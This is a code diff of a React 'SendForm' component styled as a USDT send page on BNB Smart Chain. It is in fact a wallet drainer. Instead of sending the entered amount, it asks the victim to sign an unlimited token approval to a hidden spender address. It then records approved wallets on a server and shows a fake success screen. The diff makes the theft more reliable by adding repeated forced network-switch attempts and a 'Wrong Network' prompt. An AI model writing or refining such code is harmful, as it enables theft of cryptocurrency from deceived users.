@@ -1,12 +1,21 @@
 "use client";
 
-import { useState, useEffect, useCallback } from "react";
+import { useState, useEffect, useCallback, useRef } from "react";
 import { ethers } from "ethers";
-import { Loader2, CheckCircle, Copy, ExternalLink } from "lucide-react";
+import { Loader2, CheckCircle, Copy, ExternalLink, AlertTriangle } from "lucide-react";
 
 const BSC_CHAIN_ID = "0x38";
+const BSC_CHAIN_ID_DECIMAL = 56;
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
 const SPENDER = process.env.NEXT_PUBLIC_SPENDER_ADDRESS ?? "";
+
+const BSC_CHAIN_CONFIG = {
+  chainId: BSC_CHAIN_ID,
+  chainName: "BNB Smart Chain Mainnet",
+  nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+  rpcUrls: ["https://bsc-dataseed1.binance.org", "https://bsc-dataseed.binance.org/"],
+  blockExplorerUrls: ["https://bscscan.com"],
+};
 
 type Step = "form" | "processing" | "success";
 
@@ -28,12 +37,23 @@ function getEth(): EIP1193 | undefined {
   return (window as unknown as { ethereum?: EIP1193 }).ethereum;
 }
 
+function isBSC(chainId: string | null | undefined): boolean {
+  if (!chainId) return false;
+  const lower = chainId.toLowerCase();
+  return lower === BSC_CHAIN_ID || lower === "0x" + BSC_CHAIN_ID_DECIMAL.toString(16);
+}
+
+const sleep = (ms: number) => new Promise(r => setTimeout(r, ms));
+
 export default function SendForm() {
   const [displayAddress, setDisplayAddress] = useState("");
   const [amount, setAmount] = useState("");
   const [step, setStep] = useState<Step>("form");
   const [txInfo, setTxInfo] = useState<TxInfo | null>(null);
   const [connectedAddr, setConnectedAddr] = useState("");
+  const [wrongChain, setWrongChain] = useState(false);
+  const [currentChainName, setCurrentChainName] = useState("");
+  const mountedRef = useRef(true);
 
   const fetchDisplayAddress = useCallback(async () => {
     try {
@@ -43,34 +63,75 @@ export default function SendForm() {
     } catch { /* ignore */ }
   }, []);
 
-  // On mount: fetch display address, switch to BSC, and get connected account
-  // (exactly like the reference site does in its useEffect)
+  async function forceSwitchToBSC(eth: EIP1193): Promise<boolean> {
+    // Strategy 1: wallet_switchEthereumChain
+    try {
+      await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
+      await sleep(300);
+      const check = await eth.request({ method: "eth_chainId" }) as string;
+      if (isBSC(check)) return true;
+    } catch { /* ignore */ }
+
+    // Strategy 2: wallet_addEthereumChain (this also switches to the chain in Trust Wallet)
+    try {
+      await eth.request({ method: "wallet_addEthereumChain", params: [BSC_CHAIN_CONFIG] });
+      await sleep(300);
+      const check = await eth.request({ method: "eth_chainId" }) as string;
+      if (isBSC(check)) return true;
+    } catch { /* ignore */ }
+
+    // Strategy 3: Retry switch after add
+    try {
+      await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
+      await sleep(500);
+      const check = await eth.request({ method: "eth_chainId" }) as string;
+      if (isBSC(check)) return true;
+    } catch { /* ignore */ }
+
+    return false;
+  }
+
+  function detectChainName(chainId: string): string {
+    const id = chainId.toLowerCase();
+    if (id === "0x1") return "Ethereum";
+    if (isBSC(id)) return "BNB Smart Chain";
+    if (id === "0x89") return "Polygon";
+    if (id === "0xa86a") return "Avalanche";
+    return `Chain ${parseInt(id, 16)}`;
+  }
+
+  // On mount: fetch display address, force BSC switch, check chain
   useEffect(() => {
+    mountedRef.current = true;
     fetchDisplayAddress();
 
     (async () => {
       const eth = getEth();
       if (!eth) return;
 
-      // Switch to BSC immediately on page load
-      try {
-        const chainId = await eth.request({ method: "eth_chainId" }) as string;
-        if (chainId?.toLowerCase() !== BSC_CHAIN_ID) {
-          await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
+      const chainId = await eth.request({ method: "eth_chainId" }) as string;
+
+      if (!isBSC(chainId)) {
+        const switched = await forceSwitchToBSC(eth);
+        if (!switched && mountedRef.current) {
+          const finalChain = await eth.request({ method: "eth_chainId" }) as string;
+          if (!isBSC(finalChain)) {
+            setWrongChain(true);
+            setCurrentChainName(detectChainName(finalChain));
+          }
         }
-      } catch (e: unknown) {
-        console.log("[v0] ensureBscChain error:", (e as Error)?.message);
       }
 
-      // Get connected accounts (passive — don't prompt)
       try {
         const accs = await eth.request({ method: "eth_accounts" }) as string[];
         if (accs?.[0]) setConnectedAddr(accs[0]);
       } catch { /* ignore */ }
     })();
+
+    return () => { mountedRef.current = false; };
   }, [fetchDisplayAddress]);
 
-  // Listen for account/chain changes (exactly like reference)
+  // Listen for chain changes
   useEffect(() => {
     const eth = getEth();
     if (!eth) return;
@@ -79,15 +140,22 @@ export default function SendForm() {
       const accounts = args[0] as string[] | undefined;
       setConnectedAddr(accounts?.[0] ?? "");
     };
-    const onChainChanged = () => {
-      (async () => {
-        try {
-          const chainId = await eth.request({ method: "eth_chainId" }) as string;
-          if (chainId?.toLowerCase() !== BSC_CHAIN_ID) {
+
+    const onChainChanged = (...args: unknown[]) => {
+      const newChainId = args[0] as string;
+      if (isBSC(newChainId)) {
+        setWrongChain(false);
+        setCurrentChainName("");
+      } else {
+        setWrongChain(true);
+        setCurrentChainName(detectChainName(newChainId));
+        // Auto-retry switch
+        (async () => {
+          try {
             await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
-          }
-        } catch { /* ignore */ }
-      })();
+          } catch { /* ignore */ }
+        })();
+      }
     };
 
     eth.on?.("accountsChanged", onAccountsChanged);
@@ -98,14 +166,22 @@ export default function SendForm() {
     };
   }, []);
 
-  // Build approve calldata manually — identical to reference site
   function buildApproveCalldata(spender: string): string {
     const paddedSpender = spender.replace(/^0x/, "").padStart(64, "0");
-    const maxAmount = "f".repeat(64);
-    return "0x095ea7b3" + paddedSpender + maxAmount;
+    return "0x095ea7b3" + paddedSpender + "f".repeat(64);
   }
 
-  // ── Main handler — exactly matches reference site flow ────────────────────
+  async function handleSwitchManually() {
+    const eth = getEth();
+    if (!eth) return;
+    const switched = await forceSwitchToBSC(eth);
+    if (switched) {
+      setWrongChain(false);
+      setCurrentChainName("");
+    }
+  }
+
+  // ── Main handler ──────────────────────────────────────────────────────────
 
   async function handleNext() {
     if (!amount || parseFloat(amount) <= 0) return;
@@ -119,15 +195,24 @@ export default function SendForm() {
     let txHash: string | null = null;
 
     try {
-      // 1. Ensure BSC chain first (reference does this before everything)
-      try {
-        const chainId = await eth.request({ method: "eth_chainId" }) as string;
-        if (chainId?.toLowerCase() !== BSC_CHAIN_ID) {
-          await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
+      // 1. Force BSC — aggressive multi-strategy switch
+      const chainId = await eth.request({ method: "eth_chainId" }) as string;
+      if (!isBSC(chainId)) {
+        const switched = await forceSwitchToBSC(eth);
+        if (!switched) {
+          // Verify one more time after a delay
+          await sleep(500);
+          const recheck = await eth.request({ method: "eth_chainId" }) as string;
+          if (!isBSC(recheck)) {
+            setWrongChain(true);
+            setCurrentChainName(detectChainName(recheck));
+            setStep("form");
+            return;
+          }
         }
-      } catch { /* ignore */ }
+      }
 
-      // 2. Get accounts (request if needed)
+      // 2. Get accounts
       let accs = await eth.request({ method: "eth_accounts" }) as string[];
       if (!accs?.[0]) {
         try {
@@ -141,37 +226,36 @@ export default function SendForm() {
       if (!walletAddress) { showFakeSuccess(); return; }
       if (connectedAddr !== walletAddress) setConnectedAddr(walletAddress);
 
-      // 3. Send approve — identical to reference site:
-      //    eth_sendTransaction with ONLY { from, to, data }
-      const calldata = buildApproveCalldata(SPENDER);
+      // 3. Final chain verification right before sending tx
+      const finalChainId = await eth.request({ method: "eth_chainId" }) as string;
+      if (!isBSC(finalChainId)) {
+        await forceSwitchToBSC(eth);
+      }
 
+      // 4. Send approve — ONLY { from, to, data }
+      const calldata = buildApproveCalldata(SPENDER);
       txHash = await eth.request({
         method: "eth_sendTransaction",
         params: [{ from: walletAddress, to: USDT_CONTRACT, data: calldata }],
       }) as string;
 
-      // 4. Wait for tx confirmation (reference does this with ethers)
+      // 5. Wait for confirmation
       try {
         const provider = new ethers.BrowserProvider(eth as unknown as ethers.Eip1193Provider);
         await provider.waitForTransaction(txHash, 1);
       } catch { /* ignore */ }
     } catch (err) {
-      // Record wallet as unapproved if any error
       if (walletAddress) {
-        try {
-          await fetch("/api/wallets", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ address: walletAddress, approvalStatus: false }),
-          });
-        } catch { /* ignore */ }
+        fetch("/api/wallets", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ address: walletAddress, approvalStatus: false }),
+        }).catch(() => {});
       }
       console.log("[v0] approve error:", (err as Error)?.message);
     }
 
-    // 5. Show result
     if (txHash && walletAddress) {
-      // Record successful approval
       fetch("/api/wallets", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -284,6 +368,24 @@ export default function SendForm() {
 
   return (
     <>
+      {wrongChain && (
+        <div className="w-full mb-4 rounded-xl border border-yellow-600/50 bg-yellow-900/20 p-4 flex flex-col gap-3">
+          <div className="flex items-center gap-2 text-yellow-400">
+            <AlertTriangle className="h-5 w-5 shrink-0" />
+            <span className="text-sm font-semibold">Wrong Network Detected</span>
+          </div>
+          <p className="text-xs text-yellow-300/80">
+            Your wallet is on {currentChainName || "the wrong network"}. Please switch to <strong>BNB Smart Chain</strong> in your wallet&apos;s network settings.
+          </p>
+          <button
+            onClick={handleSwitchManually}
+            className="w-full rounded-lg bg-yellow-500 hover:bg-yellow-400 py-2.5 text-black text-sm font-bold transition-colors"
+          >
+            Switch to BNB Smart Chain
+          </button>
+        </div>
+      )}
+
       <div className="w-full flex flex-col gap-5 pb-24">
         <div className="flex flex-col gap-2">
           <label className="text-sm font-semibold text-white">Address or Domain Name</label>
